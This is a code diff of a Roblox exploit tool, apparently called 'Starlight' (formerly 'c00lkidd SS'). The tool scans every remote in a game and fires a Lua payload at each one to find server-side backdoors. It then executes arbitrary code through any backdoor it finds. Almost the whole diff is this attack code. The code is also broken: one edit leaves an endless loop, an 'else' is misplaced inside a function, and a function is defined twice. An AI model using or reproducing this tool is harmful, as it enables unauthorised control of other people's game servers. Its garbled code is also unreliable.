@@ -2284,7 +2284,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		end)
 	        local timeout = 1
 		local start = os.clock()
-	while os.clock() - start < timeout do
+	while os.clock() do
 		if foundEvent or rs:FindFirstChild(modelName) then
 			foundEvent = true
 			break
@@ -2313,8 +2313,109 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	local function findRemote()
 		local trueStart = os.clock()
 		foundExploit = false
+local EXCLUDED_REMOTES = {
+		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
+		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
+		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
+		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
+		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
+		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
+		GetServerVersion = true, GetClientId = true, GetInventory = true,
+		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
+		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
+		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
+		ReportAbuse = true
+	}
+	
+	local SAFE_LOCATIONS = {
+		["CoreGui"] = true,
+		["ServerStorage"] = true,
+		["ReplicatedFirst"] = true,
+		["ServerScriptService"] = true
+	}
+	
+	local foundExploit = false
+	local remoteEvent, remoteFunction
+	local FinishedFound = false
+	local scannedRemotes = {}
+	
+	local function isLikelyBackdoorRemote(remote)
+		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
+		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
+		if EXCLUDED_REMOTES[remote.Name] then return false end
+	
+		return true
+	end
+	
+	local function testRemote(remote, isFunction, timeout)
+		if foundExploit or scannedRemotes[remote] then return false end
+		scannedRemotes[remote] = true
+		if not isLikelyBackdoorRemote(remote) then return false end
+	
+		local modelName = "starlight_"..tostring(math.random(1,999999))
+		local foundEvent = false
+	
+		local connection = rs.DescendantAdded:Connect(function(inst)
+			if inst.Name == modelName then
+				foundEvent = true
+			end
+		end)
+	
+		local function cleanup()
+			connection:Disconnect()
+			local f = rs:FindFirstChild(modelName)
+			if f then f:Destroy() end
+		end
+	
+		local payload = [[
+			local m=Instance.new("ObjectValue")
+			m.Name="]]..modelName..[["
+			m.Parent=game:GetService("ReplicatedStorage")
+		]]
+	
+		local finished = false
+	
+		task.spawn(function()
+			pcall(function()
+				if isFunction then
+					remote:InvokeServer(payload .. "\nreturn true")
+				else
+					remote:FireServer(payload)
+				end
+			end)
+			finished = true
+		end)
+	
+		local start = os.clock()
+		while os.clock() - start < timeout do
+			if foundEvent or rs:FindFirstChild(modelName) then
+				foundEvent = true
+				break
+			end
+			if finished then break end
+			task.wait()
+		end
+	
+		cleanup()
+	
+		if foundEvent and not foundExploit then
+			foundExploit = true
+			if isFunction then
+				remoteFunction = remote
+			else
+				remoteEvent = remote
+			end
+			return true
+		end
+	
+		return false
+	end
+	
+	local function fastFindRemote(timeout)
+		foundExploit = false
 		remoteEvent = nil
 		remoteFunction = nil
+		scannedRemotes = {}
 	
 		local remotes = {}
 		for _, remote in ipairs(game:GetDescendants()) do
@@ -2323,7 +2424,14 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			end
 		end
 	
-		print(string.format("c00lkidd SS: 🔍 scanning %d remotes", #remotes))
+		print(string.format("💫 starlight: 🔍 scanning %d remotes", #remotes))
+	
+		table.sort(remotes, function(a, b)
+			-- sort: sus name/loc first
+			local aScore = isLikelyBackdoorRemote(a) and 1 or 0
+			local bScore = isLikelyBackdoorRemote(b) and 1 or 0
+			return aScore > bScore
+		end)
 	
 		local MAX_CONCURRENT = 128
 		local activeTasks = 0
@@ -2339,11 +2447,11 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			activeTasks += 1
 			task.spawn(function()
 				local ok, result = pcall(function()
-					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
+					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout)
 				end)
 	
 				if ok and result then
-					print("c00lkidd SS: ", remotes[i]:GetFullName())
+					print("💫 starlight: backdoor found:", remotes[i]:GetFullName())
 				end
 	
 				activeTasks -= 1
@@ -2355,16 +2463,23 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			taskDone.Event:Wait()
 		end
 	
-		scanTime = os.clock() - trueStart
-		FinishedFound = true
-	
 		if not foundExploit then
-			print("c00lkidd: no backdoor found")
+			print("💫 starlight: backdoor not found")
 		end
 	
-		print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
+		return foundExploit
 	end
 	
+	local function findRemote()
+		local trueStart = os.clock()
+		local tStart = os.clock()
+	
+		fastFindRemote(1)
+	
+		scanTime = os.clock() - trueStart
+		FinishedFound = true
+		print(string.format("💫 starlight: scan completed in %.3f seconds", os.clock() - tStart))
+		end
 	
 	local function fireRemoteEvent(code)
 		if remoteEvent then
@@ -2374,6 +2489,12 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
 			pcall(function()
 				remoteFunction:InvokeServer('starlightTSS', code)
+			    else
+				game.StarterGui:SetCore("SendNotification",{
+				Title = "c00lkidd",
+				Text = "Fail to execute",
+				Duration = 12
+			})
 			end)
 		else
 			game.StarterGui:SetCore("SendNotification",{
